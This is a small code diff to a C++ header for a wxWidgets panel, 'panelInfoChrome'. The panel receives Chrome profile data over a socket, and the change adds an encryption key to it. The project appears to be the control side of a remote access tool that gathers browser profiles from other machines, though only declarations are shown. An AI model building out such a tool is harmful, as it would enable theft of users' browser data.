@@ -21,13 +21,14 @@ struct ColumnData {
 
 class panelInfoChrome : public wxFrame {
 	public:
-		panelInfoChrome(wxWindow* pParent, SOCKET sck_socket, wxString _title, std::string _strID);
+		panelInfoChrome(wxWindow* pParent, SOCKET sck_socket, wxString _title, std::string _strID, ByteArray c_key);
 
 		void m_AgregarDataPerfiles(const std::string& strBuffer);
 		void m_ProcesarInfoPerfil(const std::string& strBuffer);
 
 	private:
 		SOCKET sckSocket = INVALID_SOCKET;
+		ByteArray enc_key;
 		
 		void OnProcesarBoton(wxCommandEvent& event);
 		std::string GetSelectedUserPath();
